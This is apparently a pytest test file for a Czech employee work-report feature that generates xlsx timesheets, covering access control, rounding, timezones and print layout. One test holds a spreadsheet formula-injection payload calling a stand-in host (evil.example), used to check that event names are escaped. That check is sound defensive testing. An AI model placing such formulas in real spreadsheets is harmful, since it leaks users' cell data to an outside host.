"""Tests for the výkaz práce (employee work report) feature."""

import os
import uuid
from datetime import datetime, timedelta, timezone
from decimal import Decimal
from zoneinfo import ZoneInfo

import openpyxl
import pytest

from app.extensions import db
from app.models.assignment import Assignment
from app.models.audit import AuditLogEntry
from app.models.event import Event, EventSpot, EventStatus
from app.models.master_event import MasterEvent
from app.models.role import Role
from app.models.user import UserAccount
from app.routes.work_report import _last_completed_month
from app.scheduler_tasks import cleanup_work_report_files
from app.signature import process_signature_upload
from app.work_report_generator import _col_width_to_pixels, _round_up_to_half_hour, generate_work_report
from tests.conftest import _login, _make_user
from tests.test_profile_signature import _png_bytes


def _make_paid_event(
    user: UserAccount,
    start: datetime,
    end: datetime,
    actual_hours: float | None = None,
    name: str = "Testovací akce",
) -> Event:
    """Create a COMPLETED paid event with an assignment for *user*."""
    me = MasterEvent(name=f"{name} {uuid.uuid4().hex[:8]}")
    db.session.add(me)
    db.session.flush()

    ev = Event(
        name=name,
        master_event_id=me.id,
        status=EventStatus.COMPLETED,
        start_datetime=start,
        end_datetime=end,
        paid=True,
    )
    if actual_hours is not None:
        ev.actual_start_datetime = start
        ev.actual_end_datetime = start + timedelta(hours=actual_hours)
    db.session.add(ev)
    db.session.flush()

    spot = EventSpot(event_id=ev.id, description="Záchranář")
    db.session.add(spot)
    db.session.flush()

    admin = db.session.scalar(db.select(UserAccount).where(UserAccount.email == "admin@test.com"))
    if admin is None:
        role = db.session.scalar(db.select(Role).where(Role.name == Role.ADMIN))
        admin = UserAccount(email="admin@test.com", name="Admin", is_active=True)
        admin.set_password("adminpass")
        admin.roles = [role]
        db.session.add(admin)
        db.session.flush()

    asgn = Assignment(spot_id=spot.id, user_id=user.id, assigned_by_id=admin.id)
    db.session.add(asgn)
    db.session.commit()
    return ev


class _FixedNow(datetime):
    @classmethod
    def now(cls, tz=None):
        return cls(2026, 6, 15, 12, 0, tzinfo=tz)


# ── Route smoke tests ──────────────────────────────────────────────────────────


class TestVykazIndex:
    def test_defaults_to_last_completed_month(self):
        assert _last_completed_month(datetime(2026, 9, 1, tzinfo=timezone.utc)) == (2026, 8)
        assert _last_completed_month(datetime(2026, 1, 1, tzinfo=timezone.utc)) == (2025, 12)

    def test_requires_login(self, client):
        resp = client.get("/work-report/", follow_redirects=False)
        assert resp.status_code in (301, 302)
        assert "/auth/login" in resp.headers["Location"]

    def test_index_returns_200(self, app, client):
        with app.app_context():
            _make_user("vykaz_idx@test.com", "Vykaz User", Role.MEMBER)
        _login(client, "vykaz_idx@test.com")
        resp = client.get("/work-report/")
        assert resp.status_code == 200
        assert "Výkaz práce" in resp.data.decode()
        assert "Leden" in resp.data.decode()
        assert "Prosinec" in resp.data.decode()

    def test_viewer_gets_403(self, viewer_client):
        resp = viewer_client.get("/work-report/", follow_redirects=False)
        assert resp.status_code == 403


class TestVykazGenerate:
    def test_invalid_month_rejected(self, app, client):
        with app.app_context():
            _make_user("vykaz_bad@test.com", "Vykaz User", Role.MEMBER)
        _login(client, "vykaz_bad@test.com")
        resp = client.post(
            "/work-report/generate",
            data={"year": "2026", "month": "99", "csrf_token": "x"},
            follow_redirects=True,
        )
        assert resp.status_code == 200
        assert "Měsíc musí být" in resp.data.decode()

    @pytest.mark.parametrize(
        ("form", "message"),
        [
            ({"year": "abc", "month": "1"}, "Neplatné hodnoty formuláře"),
            ({"year": "2019", "month": "1"}, "Rok je mimo povolený rozsah"),
            ({"year": "2099", "month": "1"}, "Rok je mimo povolený rozsah"),
        ],
    )
    def test_invalid_form_rejected(self, member_client, form, message):
        resp = member_client.post("/work-report/generate", data={**form, "csrf_token": "x"}, follow_redirects=True)
        assert message in resp.data.decode()

    def test_future_month_rejected(self, member_client, monkeypatch):
        monkeypatch.setattr("app.routes.work_report.datetime", _FixedNow)
        resp = member_client.post(
            "/work-report/generate", data={"year": "2026", "month": "7", "csrf_token": "x"}, follow_redirects=True
        )
        assert "budoucí měsíc" in resp.data.decode()

    def test_generate_creates_file_and_shows_list(self, app, client, tmp_path, monkeypatch):
        """POST /work-report/generate creates an xlsx and shows it in the report list."""
        with app.app_context():
            _make_user("vykaz_gen@test.com", "Jana Nováková", Role.MEMBER)

        # Patch instance_path so we don't litter the real instance dir
        monkeypatch.setattr(app, "instance_path", str(tmp_path))

        _login(client, "vykaz_gen@test.com")
        resp = client.post(
            "/work-report/generate",
            data={"year": "2026", "month": "1", "csrf_token": "x"},
            follow_redirects=True,
        )
        assert resp.status_code == 200
        body = resp.data.decode()
        # Flash success message
        assert "Leden" in body
        assert "2026" in body
        # Index now shows the download link for the generated report
        assert "/work-report/download" in body

        with app.app_context():
            user = db.session.scalar(db.select(UserAccount).where(UserAccount.email == "vykaz_gen@test.com"))
            out = tmp_path / "work_report" / str(user.id) / "2026-01.xlsx"
        assert out.exists(), "xlsx file was not created"


class TestVykazDownload:
    def test_download_invalid_params_redirects(self, member_client):
        resp = member_client.get("/work-report/download?year=abc", follow_redirects=True)
        assert "Neplatné parametry" in resp.data.decode()

    def test_download_missing_file_redirects(self, app, client):
        with app.app_context():
            _make_user("vykaz_dl@test.com", "Vykaz User", Role.MEMBER)
        _login(client, "vykaz_dl@test.com")
        resp = client.get("/work-report/download?year=2026&month=1", follow_redirects=True)
        assert resp.status_code == 200
        assert "nenalezen" in resp.data.decode()


class TestVykazForOtherUser:
    def _target_id(self, app, email: str) -> str:
        with app.app_context():
            return str(_make_user(email, "Karel Cizí", Role.MEMBER).id)

    def test_coordinator_generates_and_downloads_for_other(self, app, coordinator_client, tmp_path, monkeypatch):
        target_id = self._target_id(app, "vykaz_other@test.com")
        monkeypatch.setattr(app, "instance_path", str(tmp_path))

        resp = coordinator_client.post(
            "/work-report/generate",
            data={"year": "2026", "month": "1", "user_id": target_id, "csrf_token": "x"},
            follow_redirects=True,
        )
        body = resp.data.decode()
        assert "Karel Cizí" in body
        assert f"user_id={target_id}" in body
        assert (tmp_path / "work_report" / target_id / "2026-01.xlsx").exists()

        resp = coordinator_client.get(f"/work-report/download?year=2026&month=1&user_id={target_id}")
        assert resp.status_code == 200
        assert "Karel" in resp.headers["Content-Disposition"]

    def test_other_user_report_omits_signature_and_is_audited(self, app, coordinator_client, tmp_path, monkeypatch):
        with app.app_context():
            u = _make_user("vykaz_other_sig@test.com", "Karel Cizí", Role.MEMBER)
            u.signature_image = process_signature_upload(_png_bytes())
            u.signature_mimetype = "image/png"
            db.session.commit()
            target_id = str(u.id)
        monkeypatch.setattr(app, "instance_path", str(tmp_path))

        coordinator_client.post(
            "/work-report/generate",
            data={"year": "2026", "month": "1", "user_id": target_id, "csrf_token": "x"},
        )

        wb = openpyxl.load_workbook(str(tmp_path / "work_report" / target_id / "2026-01.xlsx"))
        assert len(wb.active._images) == 0
        with app.app_context():
            entry = db.session.scalar(db.select(AuditLogEntry).where(AuditLogEntry.entity_id == target_id))
            assert entry is not None
            assert entry.action_type == "export"
            assert "Karel Cizí" in entry.summary

    def test_validation_error_keeps_target_user(self, app, coordinator_client):
        target_id = self._target_id(app, "vykaz_other_val@test.com")
        resp = coordinator_client.post(
            "/work-report/generate",
            data={"year": "2026", "month": "99", "user_id": target_id, "csrf_token": "x"},
        )
        assert resp.status_code == 302
        assert f"user_id={target_id}" in resp.headers["Location"]

    def test_invalid_or_unknown_user_id_is_404(self, coordinator_client):
        assert coordinator_client.get("/work-report/?user_id=not-a-uuid").status_code == 404
        assert coordinator_client.get(f"/work-report/?user_id={uuid.uuid4()}").status_code == 404

    def test_own_id_in_any_case_counts_as_own(self, app, client):
        with app.app_context():
            own_id = str(_make_user("vykaz_own_case@test.com", "Vykaz User", Role.MEMBER).id)
        _login(client, "vykaz_own_case@test.com")
        assert client.get(f"/work-report/?user_id={own_id.upper()}").status_code == 200

    def test_member_cannot_act_for_other(self, app, member_client):
        target_id = self._target_id(app, "vykaz_other_m@test.com")
        assert member_client.get(f"/work-report/?user_id={target_id}").status_code == 403
        resp = member_client.post(
            "/work-report/generate",
            data={"year": "2026", "month": "1", "user_id": target_id, "csrf_token": "x"},
        )
        assert resp.status_code == 403

    def test_detail_button_shown_to_coordinator(self, app, coordinator_client):
        target_id = self._target_id(app, "vykaz_other_btn@test.com")
        assert f"/work-report/?user_id={target_id}" in coordinator_client.get(f"/users/{target_id}").data.decode()

    def test_detail_button_hidden_from_member(self, app, member_client):
        target_id = self._target_id(app, "vykaz_other_btn_m@test.com")
        assert "/work-report/?user_id=" not in member_client.get(f"/users/{target_id}").data.decode()


# ── Generator unit tests ───────────────────────────────────────────────────────


class TestVykazGenerator:
    def test_generator_produces_valid_xlsx(self, app, tmp_path, monkeypatch):
        """generate_work_report creates a readable xlsx with correct sheet name."""

        with app.app_context():
            monkeypatch.setattr(app, "instance_path", str(tmp_path))
            u = _make_user("vykaz_unit@test.com", "Petr Svoboda", Role.MEMBER)
            path = generate_work_report(u, 2026, 1)

        assert path.exists()
        wb = openpyxl.load_workbook(str(path))
        assert wb.sheetnames == ["Leden"]

    def test_generator_correct_day_count(self, app, tmp_path, monkeypatch):
        """February 2026 should have 28 day rows (not 29 or 31)."""

        with app.app_context():
            monkeypatch.setattr(app, "instance_path", str(tmp_path))
            u = _make_user("vykaz_feb@test.com", "Vykaz User", Role.MEMBER)
            path = generate_work_report(u, 2026, 2)

        wb = openpyxl.load_workbook(str(path))
        ws = wb.active
        # Row 10 = day 1, row 10+27 = day 28; row 38 should be total row
        assert ws.cell(row=10, column=1).value == 1
        assert ws.cell(row=37, column=1).value == 28
        assert ws.cell(row=38, column=1).value == "Celkem hodin"
        assert ws.cell(row=38, column=3).value == "=SUM(C10:C37)"

    def test_generator_fills_paid_events(self, app, tmp_path, monkeypatch):
        """Events attended by the user appear in the correct day row."""

        now = datetime(2026, 3, 15, 10, 0, tzinfo=timezone.utc)
        end = datetime(2026, 3, 15, 14, 0, tzinfo=timezone.utc)

        with app.app_context():
            monkeypatch.setattr(app, "instance_path", str(tmp_path))
            u = _make_user("vykaz_ev@test.com", "Vykaz User", Role.MEMBER)
            _make_paid_event(u, now, end, actual_hours=4.0, name="Hasiči 2026")
            path = generate_work_report(u, 2026, 3)

        wb = openpyxl.load_workbook(str(path))
        ws = wb.active
        # March 15 is day 15 → row 10 + 14 = 24
        day_row = 10 + 15 - 1
        assert ws.cell(row=day_row, column=3).value == pytest.approx(4.0)
        assert "Hasiči 2026" in (ws.cell(row=day_row, column=4).value or "")

    @pytest.mark.parametrize(
        ("minutes", "expected"),
        [
            (0, "0"),
            (1, "0.5"),
            (30, "0.5"),
            (31, "1"),
            (600, "10"),
            (601, "10.5"),
            (606, "10.5"),  # 10.1 h
            (516, "9"),  # 8.6 h
        ],
    )
    def test_round_up_to_half_hour(self, minutes, expected):
        assert _round_up_to_half_hour(timedelta(minutes=minutes)) == Decimal(expected)

    def test_col_width_to_pixels(self):
        assert _col_width_to_pixels(0.5) == 6
        assert _col_width_to_pixels(10) == 75

    def test_generator_rounds_each_event_up_to_half_hour(self, app, tmp_path, monkeypatch):
        """Each event is rounded up on its own; the day cell sums the rounded values."""

        day_start = datetime(2026, 3, 15, 8, 0, tzinfo=timezone.utc)
        with app.app_context():
            monkeypatch.setattr(app, "instance_path", str(tmp_path))
            u = _make_user("vykaz_round@test.com", "Vykaz User", Role.MEMBER)
            # Debriefed: actual 1 h 12 min (planned 4 h) → 1.5
            _make_paid_event(u, day_start, day_start + timedelta(hours=4), actual_hours=1.2, name="A")
            # Not debriefed: scheduled 1 h 12 min → 1.5
            _make_paid_event(u, day_start, day_start + timedelta(minutes=72), name="B")
            # Another day: scheduled 8 h 36 min → 9
            other = datetime(2026, 3, 16, 8, 0, tzinfo=timezone.utc)
            _make_paid_event(u, other, other + timedelta(minutes=516), name="C")
            path = generate_work_report(u, 2026, 3)

        ws = openpyxl.load_workbook(str(path)).active
        assert ws.cell(row=10 + 15 - 1, column=3).value == pytest.approx(3.0)
        assert ws.cell(row=10 + 16 - 1, column=3).value == pytest.approx(9.0)
        assert ws.cell(row=10 + 31, column=3).value == "=SUM(C10:C40)"

    def test_generator_buckets_days_and_month_in_app_timezone(self, app, tmp_path, monkeypatch):
        """Days and month boundaries follow the app timezone (half-open month window), not UTC."""

        prague = ZoneInfo("Europe/Prague")
        monkeypatch.setattr("app.work_report_generator.get_app_tz", lambda: prague)
        monkeypatch.setattr("app.utils.get_app_tz", lambda: prague)  # used by to_local()
        hour = timedelta(hours=1)
        with app.app_context():
            monkeypatch.setattr(app, "instance_path", str(tmp_path))
            u = _make_user("vykaz_tz@test.com", "Vykaz User", Role.MEMBER)
            # 28 Feb 23:00 UTC = 1 Mar 00:00 CET → March, day 1 (inclusive start)
            feb = datetime(2026, 2, 28, 23, 0, tzinfo=timezone.utc)
            _make_paid_event(u, feb, feb + hour, name="Únor")
            # 14 Mar 23:30 UTC = 15 Mar 00:30 CET → day 15
            mid = datetime(2026, 3, 14, 23, 30, tzinfo=timezone.utc)
            _make_paid_event(u, mid, mid + hour, name="Půlnoc")
            # 31 Mar 22:00 UTC = 1 Apr 00:00 CEST → April, not March (exclusive end)
            apr = datetime(2026, 3, 31, 22, 0, tzinfo=timezone.utc)
            _make_paid_event(u, apr, apr + hour, name="Duben")
            # 31 Dec 22:30 UTC = 31 Dec 23:30 CET → December, day 31 (year wrap)
            dec = datetime(2026, 12, 31, 22, 30, tzinfo=timezone.utc)
            _make_paid_event(u, dec, dec + hour, name="Silvestr")
            march = generate_work_report(u, 2026, 3)
            ws = openpyxl.load_workbook(str(march)).active
            assert ws.cell(row=10, column=4).value == "Únor"
            assert ws.cell(row=10 + 14, column=4).value == "Půlnoc"
            assert ws.cell(row=10 + 13, column=4).value is None
            assert ws.cell(row=10 + 30, column=4).value is None

            december = generate_work_report(u, 2026, 12)
            ws = openpyxl.load_workbook(str(december)).active
            assert ws.cell(row=10 + 30, column=4).value == "Silvestr"

    def test_generator_escapes_formula_starters_in_event_names(self, app, tmp_path, monkeypatch):
        """An event named like a formula must land in the sheet as inert text."""

        start = datetime(2026, 3, 15, 10, 0, tzinfo=timezone.utc)
        end = datetime(2026, 3, 15, 14, 0, tzinfo=timezone.utc)
        payload = '=HYPERLINK("http://evil.example/"&A1,"Klikni")'

        with app.app_context():
            monkeypatch.setattr(app, "instance_path", str(tmp_path))
            u = _make_user("vykaz_inj@test.com", "Vykaz User", Role.MEMBER)
            _make_paid_event(u, start, end, actual_hours=4.0, name=payload)
            path = generate_work_report(u, 2026, 3)

        wb = openpyxl.load_workbook(str(path))
        ws = wb.active
        day_row = 10 + 15 - 1
        assert ws.cell(row=day_row, column=4).value == "'" + payload

    def test_generator_holiday_yellow(self, app, tmp_path, monkeypatch):
        """January 1 (Czech public holiday) should have yellow fill."""

        with app.app_context():
            monkeypatch.setattr(app, "instance_path", str(tmp_path))
            u = _make_user("vykaz_hol@test.com", "Vykaz User", Role.MEMBER)
            path = generate_work_report(u, 2026, 1)

        wb = openpyxl.load_workbook(str(path))
        ws = wb.active
        cell_a10 = ws.cell(row=10, column=1)
        assert cell_a10.fill.fgColor.rgb == "FFFFFF00", "Jan 1 must have yellow fill"

    def test_generator_print_setup_is_a4_portrait_fit_to_page(self, app, tmp_path, monkeypatch):
        """Generated xlsx opens print-ready: A4 portrait, fit-to-page, scoped print area."""

        with app.app_context():
            monkeypatch.setattr(app, "instance_path", str(tmp_path))
            u = _make_user("vykaz_print@test.com", "Vykaz User", Role.MEMBER)
            path = generate_work_report(u, 2026, 2)  # February = 28 days

        wb = openpyxl.load_workbook(str(path))
        ws = wb.active
        assert ws.page_setup.orientation == "portrait"
        assert ws.page_setup.paperSize == 9  # A4
        assert ws.page_setup.fitToWidth == 1
        assert ws.page_setup.fitToHeight == 1
        assert ws.sheet_properties.pageSetUpPr.fitToPage is True
        # Print area spans column A through E and ends at the boss-signature row
        # (day-1 row 10 + 27 more days + 1 totals row + 7 rows to boss sig = row 45).
        # openpyxl round-trips the print_area with a quoted sheet-name prefix.
        assert ws.print_area == "'Únor'!$A$1:$E$45"

    def test_generator_weekend_red_font(self, app, tmp_path, monkeypatch):
        """Saturday day-name cell should use red font."""

        with app.app_context():
            monkeypatch.setattr(app, "instance_path", str(tmp_path))
            u = _make_user("vykaz_wknd@test.com", "Vykaz User", Role.MEMBER)
            # January 2026: day 3 = Saturday
            path = generate_work_report(u, 2026, 1)

        wb = openpyxl.load_workbook(str(path))
        ws = wb.active
        # day 3 = row 12, col B
        b12 = ws.cell(row=12, column=2)
        assert b12.value == "SO"
        assert b12.font.color.rgb == "FFFF0000", "Saturday must have red font"


class TestCleanupVykazFiles:
    def test_cleanup_removes_old_files(self, tmp_path):

        work_report_dir = tmp_path / "work_report" / "user1"
        work_report_dir.mkdir(parents=True)
        old_file = work_report_dir / "2025-01.xlsx"
        old_file.write_bytes(b"x")
        # backdate mtime to 2 days ago
        two_days_ago = datetime.now(timezone.utc) - timedelta(days=2)
        os.utime(old_file, (two_days_ago.timestamp(), two_days_ago.timestamp()))

        new_file = work_report_dir / "2026-01.xlsx"
        new_file.write_bytes(b"x")  # fresh mtime

        removed = cleanup_work_report_files(str(tmp_path))
        assert removed == 1
        assert not old_file.exists()
        assert new_file.exists()
